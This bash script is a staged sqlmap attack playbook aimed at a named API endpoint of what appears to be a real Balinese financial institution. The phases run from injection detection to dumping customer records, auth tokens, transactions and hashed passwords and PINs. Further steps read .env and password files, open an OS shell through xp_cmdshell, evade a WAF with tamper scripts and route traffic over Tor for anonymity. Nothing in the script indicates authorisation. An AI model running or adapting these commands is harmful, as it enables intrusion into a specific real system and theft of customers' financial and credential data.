#!/bin/bash

###############################################################################
# SQLMap Manual Exploitation Commands
# Copy and paste these commands one by one
###############################################################################

# Configuration
TARGET="http://seminyak.lamanuna.biz.id:8081/lpd_seminyak/public/api/smart/transfer/lpd/check"
DATA='{"account_no":"*"}'

###############################################################################
# PHASE 1: DETECTION & FINGERPRINTING
###############################################################################

# 1.1 Basic SQLi Detection
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --level 5 \
    --risk 3 \
    --dbms "Microsoft SQL Server" \
    --random-agent

# 1.2 Fingerprint DBMS
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --fingerprint \
    --random-agent

# 1.3 Get Banner
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --banner \
    --random-agent

###############################################################################
# PHASE 2: INFORMATION GATHERING
###############################################################################

# 2.1 Current User
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --current-user \
    --random-agent

# 2.2 Current Database
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --current-db \
    --random-agent

# 2.3 Hostname
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --hostname \
    --random-agent

# 2.4 Check if DBA
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --is-dba \
    --random-agent

###############################################################################
# PHASE 3: DATABASE ENUMERATION
###############################################################################

# 3.1 List All Databases
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --dbs \
    --random-agent

# 3.2 List Tables in Giosoft_LPD
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    -D Giosoft_LPD \
    --tables \
    --random-agent

# 3.3 Get Schema Information
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --schema \
    --random-agent

###############################################################################
# PHASE 4: SENSITIVE TABLE ENUMERATION
###############################################################################

# 4.1 Columns in gmob_nasabah (Customer Data)
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    -D Giosoft_LPD \
    -T gmob_nasabah \
    --columns \
    --random-agent

# 4.2 Columns in gtb_folio (Transaction Data)
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    -D Giosoft_LPD \
    -T gtb_folio \
    --columns \
    --random-agent

# 4.3 Columns in gmob_token (Authentication)
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    -D Giosoft_LPD \
    -T gmob_token \
    --columns \
    --random-agent

# 4.4 Columns in gmob_transfer (Transfer Records)
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    -D Giosoft_LPD \
    -T gmob_transfer \
    --columns \
    --random-agent

###############################################################################
# PHASE 5: DATA EXTRACTION (SAMPLE)
###############################################################################

# 5.1 Dump gmob_nasabah (First 100 rows)
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    -D Giosoft_LPD \
    -T gmob_nasabah \
    --dump \
    --start 1 \
    --stop 100 \
    --random-agent

# 5.2 Dump gmob_token (Active Tokens)
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    -D Giosoft_LPD \
    -T gmob_token \
    --dump \
    --start 1 \
    --stop 50 \
    --random-agent

# 5.3 Dump gtb_folio (Recent Transactions)
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    -D Giosoft_LPD \
    -T gtb_folio \
    --dump \
    --start 1 \
    --stop 100 \
    --random-agent

# 5.4 Search for Specific Data (Password Columns)
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    -D Giosoft_LPD \
    -T gmob_nasabah \
    -C "username,pass_crypto,pin_crypto" \
    --dump \
    --start 1 \
    --stop 10 \
    --random-agent

###############################################################################
# PHASE 6: PRIVILEGE ENUMERATION
###############################################################################

# 6.1 List User Privileges
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --privileges \
    --random-agent

# 6.2 List Roles
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --roles \
    --random-agent

# 6.3 List Database Users
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --users \
    --random-agent

# 6.4 User Password Hashes
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --passwords \
    --random-agent

###############################################################################
# PHASE 7: FILE SYSTEM ACCESS
###############################################################################

# 7.1 Read .env File
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --file-read "C:/xampp/htdocs/lpd_seminyak/.env" \
    --random-agent

# 7.2 Read passwords.txt
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --file-read "C:/xampp/passwords.txt" \
    --random-agent

# 7.3 Read hosts file
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --file-read "C:/Windows/System32/drivers/etc/hosts" \
    --random-agent

# 7.4 Read php.ini
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --file-read "C:/xampp/php/php.ini" \
    --random-agent

###############################################################################
# PHASE 8: ADVANCED EXPLOITATION
###############################################################################

# 8.1 SQL Query Execution
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --sql-query "SELECT @@version" \
    --random-agent

# 8.2 Custom SQL Queries
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --sql-query "SELECT name FROM sys.server_principals WHERE type='S'" \
    --random-agent

# 8.3 Check xp_cmdshell Status
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --sql-query "SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell'" \
    --random-agent

###############################################################################
# PHASE 9: REMOTE CODE EXECUTION (⚠️ DANGEROUS)
###############################################################################

# 9.1 OS Shell (Interactive)
# ⚠️ WARNING: This will attempt to enable xp_cmdshell
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --os-shell \
    --random-agent

# 9.2 Execute Single OS Command
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --os-cmd "whoami" \
    --random-agent

# 9.3 SQL Shell (Interactive)
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --sql-shell \
    --random-agent

###############################################################################
# PHASE 10: ADVANCED TECHNIQUES
###############################################################################

# 10.1 Time-Based Blind SQLi
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --technique T \
    --level 5 \
    --risk 3 \
    --random-agent

# 10.2 Union-Based SQLi
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --technique U \
    --level 5 \
    --risk 3 \
    --random-agent

# 10.3 Stacked Queries
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --technique S \
    --level 5 \
    --risk 3 \
    --random-agent

# 10.4 Error-Based SQLi
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --technique E \
    --level 5 \
    --risk 3 \
    --random-agent

###############################################################################
# PHASE 11: TAMPER SCRIPTS (WAF Bypass)
###############################################################################

# 11.1 Space to Comment
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --tamper space2comment \
    --random-agent

# 11.2 Multiple Tamper Scripts
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --tamper "space2comment,between,randomcase" \
    --random-agent

###############################################################################
# USEFUL OPTIONS
###############################################################################

# Verbose output (level 1-6)
# --verbose 3

# Threads (faster scanning, use with caution)
# --threads 5

# Delay between requests (stealth mode)
# --delay 2

# Timeout
# --timeout 30

# Retry on connection failure
# --retries 3

# Parse and test forms
# --forms

# Test all parameters
# --level 5 --risk 3

# Use Tor for anonymity
# --tor --tor-type=SOCKS5 --check-tor

# Use proxy
# --proxy="http://127.0.0.1:8080"

# Save traffic to file
# --traffic-file=traffic.txt

# Resume scan
# --resume

###############################################################################
# EXAMPLE COMPLETE WORKFLOW
###############################################################################

# Step 1: Detect vulnerability
echo "[*] Step 1: Detecting SQL Injection..."
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --level 3 \
    --risk 2 \
    --random-agent

# Step 2: Enumerate databases
echo "[*] Step 2: Enumerating databases..."
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --dbs \
    --random-agent

# Step 3: Enumerate tables
echo "[*] Step 3: Enumerating tables..."
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    -D Giosoft_LPD \
    --tables \
    --random-agent

# Step 4: Dump sensitive data (sample)
echo "[*] Step 4: Dumping sample data..."
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    -D Giosoft_LPD \
    -T gmob_nasabah \
    --dump \
    --start 1 \
    --stop 10 \
    --random-agent

# Step 5: Check for RCE capability
echo "[*] Step 5: Checking for RCE..."
sqlmap -u "$TARGET" \
    --method POST \
    --data "$DATA" \
    --headers "Content-Type: application/json" \
    --batch \
    --os-cmd "echo RCE_TEST" \
    --random-agent

echo ""
echo "[✓] Complete workflow finished!"
echo "[*] Check SQLMap output directory for results"

###############################################################################
# END OF COMMANDS
###############################################################################
